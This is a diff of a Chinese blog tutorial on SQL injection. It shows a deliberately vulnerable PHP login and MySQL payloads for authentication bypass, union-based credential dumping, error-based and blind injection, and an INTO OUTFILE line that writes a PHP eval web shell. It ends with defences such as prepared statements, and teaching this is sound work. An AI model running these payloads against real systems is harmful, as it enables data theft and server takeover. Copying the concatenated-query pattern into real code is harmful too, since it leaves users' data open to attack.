@@ -19,17 +19,17 @@
   <meta name="author" content="yunli">
   <meta name="keywords" content="">
   
-    <meta name="description" content="什么是SQL  在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名a[1]，字典就需">
+    <meta name="description" content="初始SQL注入什么是SQL在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名a[1]">
 <meta property="og:type" content="article">
 <meta property="og:title" content="初识sql注入">
 <meta property="og:url" content="http://blog.yunli1.com/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="noob weber">
-<meta property="og:description" content="什么是SQL  在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名a[1]，字典就需">
+<meta property="og:description" content="初始SQL注入什么是SQL在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名a[1]">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.yunli1.com/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/1.png">
 <meta property="og:image" content="http://blog.yunli1.com/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/2.png">
 <meta property="article:published_time" content="2026-05-24T03:26:06.000Z">
-<meta property="article:modified_time" content="2026-05-24T03:32:58.435Z">
+<meta property="article:modified_time" content="2026-10-20T02:47:20.002Z">
 <meta property="article:author" content="yunli">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -331,7 +331,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10k 字
+          9.9k 字
         
       </span>
     
@@ -342,7 +342,7 @@
         
         
         
-          84 分钟
+          83 分钟
         
       </span>
     
@@ -386,25 +386,15 @@
             
               <div class="markdown-body">
                 
-                <h1 id="什么是sql">什么是SQL</h1>
-
-<p>在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名<code>a[1]</code>，字典就需要知道键<code>a[&quot;1&quot;]</code>，这种方式对于使用人来说 无疑提高了使用难度，但sql语句就比较通用，增删查改都有一套通用的逻辑，只需要知道少量信息就可以查到想要的信息，例如列名。</p>
+                <h1 id="初始SQL注入"><a href="#初始SQL注入" class="headerlink" title="初始SQL注入"></a>初始SQL注入</h1><h2 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL"></a>什么是SQL</h2><p>在菜鸟的描述中，sql是一门用于管理关系数据库管理系统（RDBMS）的结构化查询语言。SQL不同于一般的编程语言，它更接近自然语言，所以会更好理解。同时SQL+数据库的存储数据方式对比用其他编程语言的方式存储数据会更方便，用python来举例吧：python存储无非就是数组，字典等，我需要知道后面存储利用的哪种方式才可以进行查询，像数组就需要知道存储位置以及数组名<code>a[1]</code>，字典就需要知道键<code>a[&quot;1&quot;]</code>，这种方式对于使用人来说 无疑提高了使用难度，但sql语句就比较通用，增删查改都有一套通用的逻辑，只需要知道少量信息就可以查到想要的信息，例如列名。</p>
 <p>想进一步了解SQL的意义可以看下面这篇文章：<br><a target="_blank" rel="noopener" href="https://leemeng.tw/why-you-need-to-learn-sql-as-a-data-scientist.html">https://leemeng.tw/why-you-need-to-learn-sql-as-a-data-scientist.html</a></p>
-<h2>SQL注入原理</h2>
-
-<p>在讲解SQL注入原理之前，我们先来看看一些SQL语句是怎么使用的</p>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>在讲解SQL注入原理之前，我们先来看看一些SQL语句是怎么使用的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dsn</span> = <span class="hljs-string">&#x27;mysql:host=localhost;dbname=testdb;charset=utf8mb4&#x27;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;db_user&#x27;</span>;    <br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&#x27;db_password&#x27;</span>; <br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请输入用户名和密码&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>); <br><br>    <span class="hljs-variable">$userRow</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userRow</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;🎉 登录成功！欢迎，&quot;</span> . <span class="hljs-variable">$userRow</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;❌ 登录失败：用户名或密码错误。&quot;</span>;<br>    &#125;<br><br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库错误: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>上面是一个简单的登录逻辑，接收用户的输入拼接进sql语句中发送给数据库查询，若能查询到相关的信息，就可以成功登录。</p>
 <p>但这里若是我们小小的改变一下我们的输入会有什么结果呢：<code>username=admin&#39; or &#39;1=1&amp;passwd=123</code>，输入这个后我们可以成功登入。想必大家从这就可以读出一个点，SQL注入说白了就是利用字符串拼接，将字符作为代码来执行了。</p>
-<h2>SQL注入姿势</h2>
-
-<p>下面的姿势我们都用mysql来讲</p>
-<h3>union注入
-</h3>
-
-
-<p>union注入就是利用了union联合查询的原理</p>
+<h2 id="SQL注入姿势"><a href="#SQL注入姿势" class="headerlink" title="SQL注入姿势"></a>SQL注入姿势</h2><p>下面的姿势我们都用mysql来讲</p>
+<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union注入就是利用了union联合查询的原理</p>
 <ul>
 <li>使用前提：可以显示或查询到select结果</li>
 </ul>
@@ -422,49 +412,35 @@
 <p>（4）查询具体内容</p>
 <p><code>select 1,group_concat(username,&#39;~&#39;,password),2 from users</code></p>
 <p>（<del>是区分内容，好看点，“</del>”号可用0x7e代替）</p>
-<h3>报错注入</h3>
-
-<p>有时页面在我们输入正确语句是不会出现结果的，这时候就可以用报错注入。所谓报错注入就是我们故意构造语句，让错误信息中夹杂可以显示数据库内容的查询语句，返回报错提示中包括数据库中的内容。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>有时页面在我们输入正确语句是不会出现结果的，这时候就可以用报错注入。所谓报错注入就是我们故意构造语句，让错误信息中夹杂可以显示数据库内容的查询语句，返回报错提示中包括数据库中的内容。</p>
 <ul>
 <li>使用前提：会将sql语句的结果显示到前端</li>
 </ul>
-<h5>extractvalue 报错注入
-</h5>
-
-<p>1.extractvalue包含两个参数，第一个参数XML 文档对象名称，第二个参数路径，当我们写错路径格式就会返回报错<br><img src="/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue 报错注入"></a>extractvalue 报错注入</h4><p>1.extractvalue包含两个参数，第一个参数XML 文档对象名称，第二个参数路径，当我们写错路径格式就会返回报错<br><img src="/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>2.利用：<code>union 1,select extractvalue(1,concat(0x7e,(select database()))),3--+</code><br><img src="/2026/05/24/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里我的数据库就叫sql，可以看出成功将我的库名拿到了</p>
-<h5>updatexml 报错注入</h5>
-
-<p>1.updatexml()函数与extractvalue()函数类似，都是对xml文档进行操作。只不过updatexml()从英文字面上来看就知道是更新的意思。即updatexml()是更新文档的函数。语法：updatexml(目标xml文档，xml路径，更新的内容)，和上面一样，我们的利用点也是xml路径</p>
+<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml 报错注入"></a>updatexml 报错注入</h4><p>1.updatexml()函数与extractvalue()函数类似，都是对xml文档进行操作。只不过updatexml()从英文字面上来看就知道是更新的意思。即updatexml()是更新文档的函数。语法：updatexml(目标xml文档，xml路径，更新的内容)，和上面一样，我们的利用点也是xml路径</p>
 <p>2.利用：<code>?id=1 and 1=updatexml(1,concat(&#39;~&#39;,(select database())),3)--+</code></p>
 <h5>floor报错注入</h5>
 
 <p>1.floor()报错注入的原因是 <strong>group by</strong>在向临时表插入数据时，由于 **rand()**多次计算导致插入临时表时主键重复，从而报错，又因为报错前 **concat()**中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或数执行后的结果。<br>想详细理解可以看下面这篇文章：</p>
-<p><a target="_blank" rel="noopener" href="https://daydust.blog.csdn.net/article/details/128569910?fromshare=blogdetail&sharetype=blogdetail&sharerId=128569910&sharerefer=PC&sharesource=lisonglin123456&sharefrom=from_link">https://daydust.blog.csdn.net/article/details/128569910?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=128569910&amp;sharerefer=PC&amp;sharesource=lisonglin123456&amp;sharefrom=from_link</a></p>
+<p><a target="_blank" rel="noopener" href="https://daydust.blog.csdn.net/article/details/128569910">floor报错注入</a></p>
 <p>2.利用：<code>1&#39; and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +</code></p>
-<h3>盲注</h3>
-
-<h5>布尔盲注</h5>
-
-<ul>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul>
 <li>使用前提：页面既没有回显位也没有报错，但有真假值状态</li>
 </ul>
 <p>1.利用：<code>union 1,select ascii(substr(select database()),1,1)&gt;=110,3--+</code></p>
-<h5>时间盲注</h5>
-
-<ul>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
 <li>使用前提：利用页面反应时间判断真假，前提是数据库会执行代码</li>
 </ul>
 <p>1.利用：<code>select if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3))</code></p>
-<h3>SQL注入文件上传</h3>
-
-<ul>
-<li>使用前提：数据库要有读写权限,要知道一个服务器上可以写入文件的文件夹的完整路径</li>
+<h3 id="SQL注入文件上传"><a href="#SQL注入文件上传" class="headerlink" title="SQL注入文件上传"></a>SQL注入文件上传</h3><ul>
+<li>使用前提：数据库要有读写权限( MySQL 账户具有 <code>FILE</code> 权限)，要知道一个服务器上可以写入文件的文件夹的完整路径</li>
 </ul>
-<p>1.利用：<code>select 1,&quot;&lt;?php @eval($_POST[&#39;password(自己设置的密码)&#39;]);?&gt;&quot;,3 into outfile &quot;（文件路径\\\benben.php&quot;)--+</code></p>
+<p>1.利用：<code>select 1,&quot;&lt;?php @eval($_POST[&#39;password(自己设置的密码)&#39;]);?&gt;&quot;,3 into outfile &quot;（文件路径\\\benben.php）&quot;)--+</code></p>
 <p>上面就是一个简单的木马，后面用蚁剑什么的链接就可以</p>
 <p>2.into outfile语法</p>
+<p>这里提个醒：<code>INTO OUTFILE</code> 不能直接覆盖已有文件</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;file_path&#x27;</span><br>[FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>]      <span class="hljs-comment">-- 字段分隔符，默认为制表符\t</span><br>[OPTIONALLY] ENCLOSED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>    <span class="hljs-comment">-- 字段引用符</span><br>LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>       <span class="hljs-comment">-- 行终结符，默认为\n</span><br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> conditions;<br></code></pre></td></tr></table></figure>
 
 <p>这里后面三个参数都是可选选项，我们来讲讲这些可选参数：</p>
@@ -691,9 +667,7 @@
 
 
 <p>做题姿势还有非常非常多，深挖下可以出现各种各样的情况，一道题在不同师傅手上能变得非常有意思。至于有哪些有意思的方法，就得各位师傅来探究了。</p>
-<h2>如何防御</h2>
-
-<p>在我的了解中，其实SQL注入说到底也就是拼接参数，将字符串作为SQL语句来执行。所以我们要解决的就是如何防用户的恶意输入。</p>
+<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>在我的了解中，其实SQL注入说到底也就是拼接参数，将字符串作为SQL语句来执行。所以我们要解决的就是如何防用户的恶意输入。</p>
 <ol>
 <li><strong>采用sql语句预编译和绑定变量，是防御sql注入的最佳方法</strong></li>
 </ol>
@@ -799,7 +773,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/07/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E7%AF%87-01-%E6%A6%82%E5%BF%B5%E5%88%9D%E7%9B%B8%E8%AF%86/" title="java反序列化入门篇-01-概念初相识">
+                      <a href="/2026/07/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" title="java反序列化入门篇-01-概念初相识">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">java反序列化入门篇-01-概念初相识</span>
                         <span class="visible-mobile">上一篇</span>
